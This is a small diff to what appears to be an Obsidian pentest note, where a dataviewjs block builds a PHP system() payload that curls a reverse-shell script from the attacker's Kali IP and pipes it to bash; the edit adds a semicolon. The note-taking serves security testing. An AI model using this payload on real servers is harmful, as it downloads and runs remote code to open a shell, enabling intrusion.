@@ -14,7 +14,7 @@ system() function to run curl and fetch a bash script from our local web server,
 ```dataviewjs
 const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `<?php system("curl ${KaliIP}:8080/rev.sh|bash"); ?>`;
+const command = `<?php system("curl ${KaliIP}:8080/rev.sh|bash;"); ?>`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
